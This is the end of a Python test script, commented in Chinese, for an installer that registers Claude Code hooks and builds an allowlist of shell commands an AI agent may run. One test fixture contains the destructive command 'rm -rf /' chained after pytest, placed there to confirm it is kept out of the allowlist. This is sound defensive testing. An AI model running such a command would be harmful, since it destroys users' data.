    code, out = run('install_hook.py', '--root', base2, '--dry-run')
    check('dry-run 成功', code == 0, out[-300:])
    check('dry-run 不写文件',
          not os.path.exists(os.path.join(base2, '.claude', 'hooks',
                                          'sdd_bash_allow.py')))

    # ---- 安装器的安全性(来自对抗式审查的发现)----
    # ① 同组里用户自己注册的 hook 不能被一起删掉
    base3 = os.path.join(tmp, 'hook-safety')
    os.makedirs(os.path.join(base3, '.claude'), exist_ok=True)
    settings3 = os.path.join(base3, '.claude', 'settings.json')
    with io.open(settings3, 'w', encoding='utf-8', newline='\n') as fh:
        fh.write(json.dumps({'hooks': {'PreToolUse': [
            {'matcher': 'Bash', 'hooks': [
                {'type': 'command', 'command': 'python ".claude/hooks/sdd_bash_allow.py"'},
                {'type': 'command', 'command': 'my-own-hook.sh'}]},
            {'matcher': 'Edit', 'hooks': [
                {'type': 'command', 'command': 'other.sh'}]}]}}, ensure_ascii=False))
    code, out = run('install_hook.py', '--root', base3)
    with io.open(settings3, encoding='utf-8') as fh:
        s3 = json.load(fh)
    cmds3 = [h.get('command', '')
             for e in s3['hooks']['PreToolUse']
             for h in (e.get('hooks') or [])]
    check('同组里用户自己的 hook 没被删', 'my-own-hook.sh' in cmds3, json.dumps(cmds3))
    check('别的 matcher 组没被动', 'other.sh' in cmds3, json.dumps(cmds3))
    check('我们的 hook 注册了三组(Bash + 写文件 + 派发)',
          sum(1 for c in cmds3 if 'sdd_bash_allow.py' in c) == 3, json.dumps(cmds3))

    # ② 结构不对就拒绝覆盖,别把用户的东西抹掉
    base4 = os.path.join(tmp, 'hook-badshape')
    os.makedirs(os.path.join(base4, '.claude'), exist_ok=True)
    bad = os.path.join(base4, '.claude', 'settings.json')
    with io.open(bad, 'w', encoding='utf-8', newline='\n') as fh:
        fh.write('{"hooks": "not-an-object"}')
    code, out = run('install_hook.py', '--root', base4)
    check('settings.json 结构不对时拒绝执行', code != 0 and 'hooks' in out, out[-300:])
    with io.open(bad, encoding='utf-8') as fh:
        check('结构不对时文件没被改写', fh.read() == '{"hooks": "not-an-object"}')

    # ③ 验证命令的提取:无反引号也能提;复合命令按段拆开收
    base5 = os.path.join(tmp, 'hook-extract')
    os.makedirs(os.path.join(base5, 'specs', 'demo'), exist_ok=True)
    with io.open(os.path.join(base5, 'specs', 'demo', 'tasks.md'), 'w',
                 encoding='utf-8', newline='\n') as fh:
        fh.write('# 任务\n\n### TASK-001: 实现登录\n\n'
                 '- **验证命令**: pytest tests/test_login.py\n'
                 '- **验证命令**: `pytest tests/test_x.py`\n'
                 '- **验证命令**: `pytest a.py && rm -rf /`\n'
                 '- **验证命令**: `cd app && npm test`\n'
                 '- **验证命令**: `npm run build && npm test`\n'
                 '- **验证命令**: `cd app && npm test` 与 `cd app && npm run build`\n'
                 '- **验证命令**: `pytest tests/test_x.py`，外加一次核对（`GET /api/v1/x`）\n'
                 '\n## 常用命令\n\n'
                 '- `npm run build`\n'
                 '- `cargo clippy --manifest-path src/app/src-tauri/Cargo.toml`\n')
    code, out = run('install_hook.py', '--root', base5, '--feature', 'demo')
    with io.open(os.path.join(base5, '.claude', 'hooks', 'sdd-hook-allow.json'),
                 encoding='utf-8') as fh:
        al5 = json.load(fh)
    check('无反引号的验证命令也能提取',
          'pytest tests/test_login.py' in al5.get('extra', []),
          json.dumps(al5, ensure_ascii=False))
    check('带反引号的验证命令也能提取',
          'pytest tests/test_x.py' in al5.get('extra', []),
          json.dumps(al5, ensure_ascii=False))
    check('含复合操作符的验证命令不放行',
          not any('rm -rf' in c for c in al5.get('extra', [])),
          json.dumps(al5, ensure_ascii=False))
    # 复合命令按段拆开:每段单独收进白名单(hook 判定复合命令也是逐段判的)
    check('前导 cd 的复合命令拆成单条收进白名单',
          'npm test' in al5.get('extra', []), json.dumps(al5, ensure_ascii=False))
    check('两段复合命令两段都收',
          'npm run build' in al5.get('extra', []), json.dumps(al5, ensure_ascii=False))
    # 一个字段里有多条命令(`` `cmd1` 与 `cmd2` ``)—— 反引号是 markdown 代码段
    check('多条命令的字段两段都收进白名单',
          'npm run build' in al5.get('extra', []) and 'npm test' in al5.get('extra', []),
          json.dumps(al5, ensure_ascii=False))
    # 散文里的片段(路径、接口)不是命令,不能进白名单
    check('散文里的路径片段不进白名单',
          not any('probe_rebuild_time.py' in c for c in al5.get('extra', [])),
          json.dumps(al5, ensure_ascii=False))
    check('散文里的 HTTP 接口不进白名单',
          not any(c.startswith('GET /api') for c in al5.get('extra', [])),
          json.dumps(al5, ensure_ascii=False))
    # 「常用命令」小节:项目自己声明的常跑命令,一次性登记
    check('常用命令小节里的命令进白名单',
          'cargo clippy --manifest-path src/app/src-tauri/Cargo.toml'
          in al5.get('extra', []), json.dumps(al5, ensure_ascii=False))
    check('复合命令不会整条进白名单',
          not any('&&' in c for c in al5.get('extra', [])),
          json.dumps(al5, ensure_ascii=False))
    # 有一段不安全 → 整条都不收(放行了半条链没有意义)
    check('有一段危险时整条复合命令都不收',
          'pytest a.py' not in al5.get('extra', []),
          json.dumps(al5, ensure_ascii=False))

    # ④ --root 指向不存在的目录要友好报错,而不是把整条目录树建出来
    code, out = run('install_hook.py', '--root', os.path.join(tmp, 'no-such-dir-xyz'))
    check('--root 指向不存在的目录时报错', code != 0 and '目录' in out, out[-200:])
    check('--root 报错时没有把目录建出来',
          not os.path.exists(os.path.join(tmp, 'no-such-dir-xyz')))

    # ⑤ hook 命令:默认绝对路径;解释器路径要加引号
    sys.path.insert(0, SCRIPTS)
    import install_hook as installer
    entry = installer.hook_entry('C:/Program Files/Python313/python.exe',
                                  os.path.join(tmp, 'x'))
    cmd = entry['hooks'][0]['command']
    check('解释器路径带空格时加了引号', cmd.startswith('"C:/Program Files/'), cmd)
    check('默认用绝对路径而不是 ${CLAUDE_PROJECT_DIR}',
          '${CLAUDE_PROJECT_DIR}' not in cmd, cmd)


def main():
    tmp = tempfile.mkdtemp(prefix='sdd-tests-')
    print('临时目录: %s' % tmp)
    try:
        test_validate_specs(tmp)
        test_verify_acceptance(tmp)
        test_update_claude_md(tmp)
        test_export_openspec(tmp)
        test_init_specs(tmp)
        test_comment_handling(tmp)
        test_meta_section(tmp)
        test_assumption_vs_open_question(tmp)
        test_as_is_mode(tmp)
        test_hook_and_installer(tmp)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    print('\n' + '=' * 52)
    print('通过 %d 项,失败 %d 项' % (len(PASSED), len(FAILED)))
    if FAILED:
        for f in FAILED:
            print('  失败: %s' % f)
        return 1
    print('全部通过')
    return 0


if __name__ == '__main__':
    sys.exit(main())
